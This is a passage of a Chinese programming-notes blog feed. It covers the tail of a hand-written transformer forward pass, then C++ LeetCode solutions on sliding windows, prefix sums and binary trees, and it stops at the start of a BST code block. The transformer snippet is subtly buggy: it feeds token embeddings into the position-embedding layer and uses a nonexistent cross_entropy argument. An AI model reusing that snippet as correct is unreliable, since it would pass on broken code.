sequence length, n_embd)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;idx&quot;</span>,idx.size())<br><br>        <span class="hljs-comment"># 通过 Embedding 层</span><br>        tok_emb = <span class="hljs-variable language_">self</span>.transformer.wte(idx)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tok_emb&quot;</span>,tok_emb.size())<br><br>        <span class="hljs-comment"># 然后通过位置编码</span><br>        pos_emb = <span class="hljs-variable language_">self</span>.transformer.wpe(tok_emb)<br><br>        <span class="hljs-comment"># 再进行 Dropout</span><br>        x = <span class="hljs-variable language_">self</span>.transformer.drop(pos_emb)<br><br>        <span class="hljs-comment"># 然后通过 Encoder</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x after wpe : &quot;</span>,x.size())<br>        enc_out = <span class="hljs-variable language_">self</span>.transformer.encoder(x)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;enc_out : &quot;</span>,enc_out.size())<br><br>        <span class="hljs-comment"># 再通过 Decoder</span><br>        x = <span class="hljs-variable language_">self</span>.transformer.decoder(x,enc_out)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x after decoder : &quot;</span>,x.size())<br><br>        <span class="hljs-keyword">if</span> targets <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-comment"># 训练阶段，如果我们给了 targets，就计算 loss</span><br>            <span class="hljs-comment"># 先通过最后的 Linear 层，得到维度为 (batch size, sequence length, vocab size)</span><br>            logits = <span class="hljs-variable language_">self</span>.lm_head(x)<br>            <span class="hljs-comment"># 再跟 targets 计算交叉熵</span><br>            loss = F.cross_entropy(logits.view(-<span class="hljs-number">1</span>,logits.size(-<span class="hljs-number">1</span>)),targets.view(-<span class="hljs-number">1</span>),ignore_idx=-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 推理阶段，我们只需要 logits，loss 为 None</span><br>            <span class="hljs-comment"># 取 -1 是只取序列中的最后一个作为输出</span><br>            logits = <span class="hljs-variable language_">self</span>.lm_head(x[:, [-<span class="hljs-number">1</span>], :]) <span class="hljs-comment"># note: using list [-1] to preserve the time dim</span><br>            loss = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span> logits, loss<br></code></pre></td></tr></table></figure><p>实不相瞒，这些代码都是我手敲的，虽然注释是复制来的，总之，<code>hands-on</code>!</p><p>最后，AI时代，学习ai，理解ai，运用ai，让其成为你的工具，而非陷入ai是不是会取代人类的焦虑，思索…</p><p>累了，先打把瓦！</p><p>感谢阅读，生活愉快！</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>attention</tag>
      
      <tag>transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>滑动窗口</title>
    <link href="/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/"/>
    <url>/2026/01/19/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><p>插个眼</p><p>以后写</p><p>先做题…</p><h2 id="3-无重复字符的最长字串"><a href="#3-无重复字符的最长字串" class="headerlink" title="3.无重复字符的最长字串"></a>3.无重复字符的最长字串</h2><p><img src="/images/56.png" alt="如图"></p><p>解：</p><p><code>滑动窗口</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">last</span><span class="hljs-params">(<span class="hljs-number">256</span>, <span class="hljs-number">-1</span>)</span></span>;   <span class="hljs-comment">// 记录每个字符上一次出现的位置</span><br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>,left = <span class="hljs-number">0</span>;        <span class="hljs-comment">// 窗口左边界</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> right = <span class="hljs-number">0</span>; right &lt; s.<span class="hljs-built_in">size</span>(); right++)&#123;<br>            <span class="hljs-keyword">if</span>(last[s[right]] &gt;= left)&#123;<br>                left = last[s[right]] + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果字符在当前窗口中重复，移动左边界</span><br>            &#125;<br>            last[s[right]] = right;<br>            ans = <span class="hljs-built_in">max</span>(ans, right - left + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="438-找到字符串中所有字母异位词"><a href="#438-找到字符串中所有字母异位词" class="headerlink" title="438.找到字符串中所有字母异位词"></a>438.找到字符串中所有字母异位词</h2><p><img src="/images/57.png" alt="如图"></p><p>解：</p><p>同理</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findAnagrams</span><span class="hljs-params">(string s, string p)</span> </span>&#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">if</span>(s.<span class="hljs-built_in">size</span>() &lt; p.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> res;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">cnt</span><span class="hljs-params">(<span class="hljs-number">26</span>,<span class="hljs-number">0</span>)</span></span>;<br><br>        <span class="hljs-comment">// 统计 p 中每个字母需要多少个</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">char</span> c: p)&#123;<br>            cnt[c - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>        &#125;<br><br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> need = p.<span class="hljs-built_in">size</span>();  <span class="hljs-comment">// 还需要匹配的字符个数</span><br><br>        <span class="hljs-keyword">while</span>(right &lt; s.<span class="hljs-built_in">size</span>())&#123;<br>            <span class="hljs-comment">// 扩展右边界</span><br>            <span class="hljs-keyword">if</span>(cnt[s[right] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>                need--;<br>            &#125;<br>            cnt[s[right] - <span class="hljs-string">&#x27;a&#x27;</span>]--;<br>            right++;<br><br>            <span class="hljs-comment">// 当窗口大小等于 p 的长度时，开始判断并移动左边界</span><br>            <span class="hljs-keyword">if</span>(right - left == p.<span class="hljs-built_in">size</span>())&#123;<br>                <span class="hljs-keyword">if</span>(need == <span class="hljs-number">0</span>)&#123;<br>                    res.<span class="hljs-built_in">push_back</span>(left);<br>                &#125;<br><br>                <span class="hljs-comment">// 收缩左边界</span><br>                <span class="hljs-keyword">if</span>(cnt[s[left] - <span class="hljs-string">&#x27;a&#x27;</span>] &gt;= <span class="hljs-number">0</span>)&#123;<br>                    need++;<br>                &#125;<br>                cnt[s[left] - <span class="hljs-string">&#x27;a&#x27;</span>]++;<br>                left++;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>滑动窗口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>子串</title>
    <link href="/2026/01/19/%E5%AD%90%E4%B8%B2/"/>
    <url>/2026/01/19/%E5%AD%90%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="子串"><a href="#子串" class="headerlink" title="子串"></a>子串</h1><p>字符串原来也是一种数据结构</p><p>子串又是什么阴</p><p>以后再说…</p><h2 id="560-和为k的子数组"><a href="#560-和为k的子数组" class="headerlink" title="560.和为k的子数组"></a>560.和为k的子数组</h2><p><img src="/images/58.png" alt="如图"></p><p>解：</p><p><code>前缀和</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map &lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; cnt;<br>        cnt[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 前缀和为 0 出现 1 次</span><br><br>        <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> x : nums)&#123;<br>            sum += x;<br>            <span class="hljs-keyword">if</span>(cnt.<span class="hljs-built_in">count</span>(sum - k))&#123;<br>                ans += cnt[sum - k];<br>            &#125;<br>            cnt[sum]++;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LeetCode</tag>
      
      <tag>子串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组</title>
    <link href="/2026/01/19/%E6%95%B0%E7%BB%84/"/>
    <url>/2026/01/19/%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>看着就简单好欺负</p><p>以后再写…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数组</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>矩阵</title>
    <link href="/2026/01/19/%E7%9F%A9%E9%98%B5/"/>
    <url>/2026/01/19/%E7%9F%A9%E9%98%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h1><p>线性代数学得怎么样?</p><p>没想到矩阵也是一种数据结构?</p><p>ai主战场</p><p>数学还是很智慧的…</p><p>插眼…</p><p>慢慢写…</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>矩阵</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树</title>
    <link href="/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2026/01/19/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>先前学习的数据结构中<code>链表</code>和<code>数组</code>均表示线性结构</p><p>然而现实世界十分复杂，怎么可能事物之间都是线性关系呢？</p><p>因此引入了<code>树</code>这种数据结构</p><p><strong>树</strong>是一种用于描述<code>层级关系</code>的<strong>非线性</strong>数据结构，由若干节点组成，其中存在一个唯一的起点(根节点root)，其余节点通过<code>父子关系</code>组织起来，很好想象吧</p><p>先来看看最典型的树，<strong>二叉树</strong>，一种特殊的树结构，其中每个节点最多包含两个子节点</p><p>各种乱七八糟的定义先不管(自己问豆包qwq)</p><p>直观地理解一下</p><p>可以想到</p><p>二叉树的任意一个节点都可以被视为一棵更小的二叉树，问题往往可以通过<strong>递归</strong>算法拆解为当前节点+左子树的问题+右子树的问题，层层递归，直至没有节点</p><p>空讲有点抽象</p><p>首先来看看二叉树的三种遍历方式</p><p>用递归的方式应该很好理解…</p><h2 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94.二叉树的中序遍历"></a>94.二叉树的中序遍历</h2><ul><li><p>中序遍历: 左 -&gt; 根 -&gt; 右</p></li><li><p>前序遍历: 根 -&gt; 左 -&gt; 右</p></li><li><p>后序遍历: 左 -&gt; 右 -&gt; 根</p></li></ul><p><img src="/images/34.png" alt="如图"></p><p><strong>递归</strong></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;<span class="hljs-type">int</span>&gt; res;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(TreeNode* root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-built_in">dfs</span>(root-&gt;left);<br>        res.<span class="hljs-built_in">push_back</span>(root-&gt;val);<br>        <span class="hljs-built_in">dfs</span>(root-&gt;right);<br>    &#125;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">dfs</span>(root);<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>求解二叉树的最大深度也是同样的思路</p><h2 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104.二叉树的最大深度"></a>104.二叉树的最大深度</h2><p><img src="/images/35.png" alt="如图"></p><p><code>递归</code></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxDepth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(<span class="hljs-built_in">maxDepth</span>(root-&gt;left), <span class="hljs-built_in">maxDepth</span>(root-&gt;right)) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>后面简单做了一些题目加深理解…</p><h2 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226.翻转二叉树"></a>226.翻转二叉树</h2><p><img src="/images/36.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">invertTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        TreeNode* left = <span class="hljs-built_in">invertTree</span>(root-&gt;left);<br>        TreeNode* right = <span class="hljs-built_in">invertTree</span>(root-&gt;right);<br><br>        root-&gt;right = left;<br>        root-&gt;left = right;<br>        <span class="hljs-keyword">return</span> root;<br>    &#125; <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101.对称二叉树"></a>101.对称二叉树</h2><p><img src="/images/37.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">isMirror</span>(root-&gt;left,root-&gt;right);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isMirror</span><span class="hljs-params">(TreeNode* a,TreeNode* b)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!a &amp;&amp; !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">//剪枝</span><br>        <span class="hljs-keyword">if</span>(!a || !b) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span>(a-&gt;val != b-&gt;val) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">isMirror</span>(a-&gt;left,b-&gt;right) &amp;&amp; <span class="hljs-built_in">isMirror</span>(a-&gt;right,b-&gt;left); <span class="hljs-comment">//对称</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543.二叉树的直径"></a>543.二叉树的直径</h2><p><img src="/images/38.png" alt="如图"></p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode* root)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(!root) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">depth</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">depth</span>(root-&gt;right);<br><br>        ans = <span class="hljs-built_in">max</span>(ans, left + right); <span class="hljs-comment">//举一反三</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(left, right) + <span class="hljs-number">1</span>;<br>    &#125; <br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">diameterOfBinaryTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">depth</span>(root);<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="108-将有序数组转换为二叉搜索树"><a href="#108-将有序数组转换为二叉搜索树" class="headerlink" title="108.将有序数组转换为二叉搜索树"></a>108.将有序数组转换为二叉搜索树</h2><p>二叉搜索树 <code>BST</code>，引入了大小关系，定义是对于任意一个节点，其左子树中所有节点的值都小于该节点，而右子树中所有节点的值都大于该节点</p><p>传统数组or链表查找，需要循环遍历，时间复杂度为$O(n)$</p><p>而不难想到二叉搜索树是$O(\log n)$</p><p>可见其在查找这件事上的优越性，类似于<strong>二分</strong>的思想?</p><p><img src="/images/39.png" alt="如图"></p><p>解：</p><p><strong>递归</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">build</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(l &gt; r) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-type">int</span> mid = l + (r - l) / <span class="hljs-number">2</span>; <span class="hljs-comment">//二分</span><br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(nums[mid]);<br>        root-&gt;left = <span class="hljs-built_in">build</span>(nums, l, mid - <span class="hljs-number">1</span>);<br>        root-&gt;right = <span class="hljs-built_in">build</span>(nums, mid + <span class="hljs-number">1</span>, r);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">sortedArrayToBST</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(nums,<span class="hljs-number">0</span>,nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125; <br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102.二叉树的层序遍历"></a>102.二叉树的层序遍历</h2><p><img src="/images/40.png" alt="如图"></p><p>要用到<code>队列</code>数据结构，其实我感觉队列和栈都挺好理解的，一个先进先出，一个后进先出罢了</p><p>解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">levelOrder</span>(TreeNode* root) &#123;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; res;<br>        <span class="hljs-keyword">if</span> (!root) <span class="hljs-keyword">return</span> res;<br>        queue&lt;TreeNode*&gt; q;  <span class="hljs-comment">//队列 先进先出 FIFO</span><br>        q.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-keyword">while</span> (!q.<span class="hljs-built_in">empty</span>()) &#123;<br>            vector&lt;<span class="hljs-type">int</span>&gt; level;<br>            <span class="hljs-type">int</span> size = q.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = q.<span class="hljs-built_in">front</span>();<br>                q.<span class="hljs-built_in">pop</span>();<br>                level.<span class="hljs-built_in">push_back</span>(node-&gt;val);<br>                <span class="hljs-keyword">if</span>(node-&gt;left) q.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span>(node-&gt;right) q.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>            res.<span class="hljs-built_in">push_back</span>(level);<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="二叉搜索树的插入-搜索与删除"><a href="#二叉搜索树的插入-搜索与删除" class="headerlink" title="二叉搜索树的插入,搜索与删除"></a>二叉搜索树的插入,搜索与删除</h2><p><code>递归实现</code></p><p>删除操作稍微麻烦一点，分类讨论即可</p><p>思考,思索…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 